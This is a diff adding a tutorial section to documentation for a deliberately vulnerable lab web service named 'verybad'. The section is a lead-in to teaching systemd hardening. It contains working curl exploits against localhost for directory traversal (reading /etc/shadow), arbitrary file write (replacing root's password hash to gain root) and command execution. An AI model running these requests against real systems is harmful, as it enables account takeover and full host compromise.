@@ -511,3 +511,162 @@ web service.
 ::
 
     $ sudo journalctl -u verybad -f
+
+
+Vulnerabilities in the application
+-----------------------------------
+
+The `verybad` application contains multiple diffrent security vulnerabilities. You can see all the available API if you 
+do a GET request to the root of the application.
+
+::
+
+  $ curl http://localhost:8000/
+  Example of poorly written code.
+      GET /getos -> will give the details of the OS.
+      GET /filename -> will provide a file from the current directory
+      GET /exec/date -> will give you the current date & time in the server.
+      POST /filename -> Saves the data in filename.
+
+
+We can get the details of the Operating system via `/getos` call, which
+internally returning us the content of the `/etc/os-release` file.
+
+::
+
+  $ curl http://localhost:8000/getos
+  NAME="Fedora Linux"
+  VERSION="35 (Cloud Edition)"
+  ID=fedora
+  VERSION_ID=35
+  VERSION_CODENAME=""
+  PLATFORM_ID="platform:f35"
+  PRETTY_NAME="Fedora Linux 35 (Cloud Edition)"
+  ANSI_COLOR="0;38;2;60;110;180"
+  LOGO=fedora-logo-icon
+  CPE_NAME="cpe:/o:fedoraproject:fedora:35"
+  HOME_URL="https://fedoraproject.org/"
+  DOCUMENTATION_URL="https://docs.fedoraproject.org/en-US/fedora/f35/system-administrators-guide/"
+  SUPPORT_URL="https://ask.fedoraproject.org/"
+  BUG_REPORT_URL="https://bugzilla.redhat.com/"
+  REDHAT_BUGZILLA_PRODUCT="Fedora"
+  REDHAT_BUGZILLA_PRODUCT_VERSION=35
+  REDHAT_SUPPORT_PRODUCT="Fedora"
+  REDHAT_SUPPORT_PRODUCT_VERSION=35
+  PRIVACY_POLICY_URL="https://fedoraproject.org/wiki/Legal:PrivacyPolicy"
+  VARIANT="Cloud Edition"
+  VARIANT_ID=cloud
+
+
+Directory traversal vulnerability
+----------------------------------
+
+`Directory traversal
+<https://portswigger.net/web-security/file-path-traversal>`_ is first
+vulnerability we are going to look into. A **GET** request to `/filename` will give us the file. Let us read the `/etc/shadow`
+file using this.
+
+::
+
+  $ curl http://localhost:8000/%2Fetc%2Fshadow
+  root:!locked::0:99999:7:::
+  bin:*:18831:0:99999:7:::
+  daemon:*:18831:0:99999:7:::
+  adm:*:18831:0:99999:7:::
+  lp:*:18831:0:99999:7:::
+  sync:*:18831:0:99999:7:::
+  shutdown:*:18831:0:99999:7:::
+  halt:*:18831:0:99999:7:::
+  mail:*:18831:0:99999:7:::
+  operator:*:18831:0:99999:7:::
+  games:*:18831:0:99999:7:::
+  ftp:*:18831:0:99999:7:::
+  nobody:*:18831:0:99999:7:::
+  dbus:!!:18926::::::
+  systemd-network:!*:18926::::::
+  systemd-oom:!*:18926::::::
+  systemd-resolve:!*:18926::::::
+  systemd-timesync:!*:18926::::::
+  systemd-coredump:!*:18926::::::
+  tss:!!:18926::::::
+  unbound:!!:18926::::::
+  sshd:!!:18926::::::
+  chrony:!!:18926::::::
+  fedora:!!:19069:0:99999:7:::
+  polkitd:!!:19069::::::
+
+In this system we don't have any password set, but in case we had any password,
+the attacker can retrive that. The attacker can read any file in the system,
+thus enables them to read the configuration or password details for any other
+application running in the same system.
+
+
+Arbitary file write vulnerability
+---------------------------------
+
+The attacker can also write to any file using **POST** request to `/filename`
+API endpoint. Thus they can add new user, add any password for a given user (via
+`/etc/shadow`). They can enable `ssh` access for the `root` user (via `/etc/ssh/sshd_config`).
+
+In the below example we are rewriting the `/etc/shadow` file with a known
+password for `root`. We prefilled the password part in the `local_shadow` file
+for `root`.
+
+::
+
+  $ cat local_shadow
+  root:$y$j9T$Ezgqn2AUuaBBQ25pABCoj/$QU3CfSAX4aLmb6mcZAqmMg4ZvEgGZpdjW632qsDtXX3:19075:0:99999:7:::
+  bin:*:18831:0:99999:7:::
+  daemon:*:18831:0:99999:7:::
+  adm:*:18831:0:99999:7:::
+  lp:*:18831:0:99999:7:::
+  sync:*:18831:0:99999:7:::
+  shutdown:*:18831:0:99999:7:::
+  halt:*:18831:0:99999:7:::
+  mail:*:18831:0:99999:7:::
+  operator:*:18831:0:99999:7:::
+  games:*:18831:0:99999:7:::
+  ftp:*:18831:0:99999:7:::
+  nobody:*:18831:0:99999:7:::
+  dbus:!!:18926::::::
+  systemd-network:!*:18926::::::
+  systemd-oom:!*:18926::::::
+  systemd-resolve:!*:18926::::::
+  systemd-timesync:!*:18926::::::
+  systemd-coredump:!*:18926::::::
+  tss:!!:18926::::::
+  unbound:!!:18926::::::
+  sshd:!!:18926::::::
+  chrony:!!:18926::::::
+  fedora:!!:19069:0:99999:7:::
+  polkitd:!!:19069::::::
+
+  $ curl --data-binary @local_shadow http://localhost:8000/%2Fetc%2Fshadow
+  Okay[fedora@selinux3 ~]$ su -
+  Password: 
+  Last login: Thu Mar 24 12:27:44 UTC 2022 on pts/2
+  [root@selinux3 ~]#
+
+You can see that after overwriting the `/etc/shadow` file, we could just use
+`password` as root's password :) To pass `/` in the URL we had to URL encode it,
+which is `%2F`.
+
+Remote code execution (RCE) vulnerability
+------------------------------------------
+
+You can execute any command on the system using **GET** request to
+`/exec/<command>` API. For example, we can see the contents of `/root/`
+directory via `ls` command. Once again we URL encoded the command and the
+argument. You can thus create a reverse shell, or any kind of damage as we are
+running the service as `root` by default.
+
+::
+
+  $ curl  http://localhost:8000/exec/id
+  uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
+  $ curl  http://localhost:8000/exec/ls%20%2Froot
+  anaconda-ks.cfg
+  original-ks.cfg
+
+Through out rest of the chapter, we will learn how to migiate these 3 kinds of vulnerabilities using systemd's builtin
+features.
